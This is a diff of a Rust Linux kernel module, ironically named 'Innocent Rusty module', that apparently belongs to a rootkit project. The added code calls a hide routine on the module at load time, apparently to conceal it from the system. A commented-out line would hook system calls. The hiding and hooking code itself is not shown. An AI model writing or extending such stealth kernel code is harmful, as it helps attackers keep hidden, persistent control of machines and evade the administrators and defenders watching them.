@@ -1,8 +1,12 @@
 //! Innocent Rusty module
 #![allow(unused)]
 #![no_std]
+
+use kernel::bindings::list_head;
 use kernel::prelude::*;
 use kernel::*;
+
+mod features;
 
 module! {
     type: IRM,
@@ -13,14 +17,11 @@ module! {
 }
 struct IRM;
 
-#[cfg(disabled)]
-include!("features/syscallhook.rs");
-
-include!("features/hide.rs");
-
 impl kernel::Module for IRM {
     fn init(_module: &'static ThisModule) -> Result<Self> {
         pr_info!("hey bud, wassup");
+        features::hide::hidemod(_module);
+        // features::hooking::syscall::hook_syscalls();
         Ok(IRM)
     }
 }
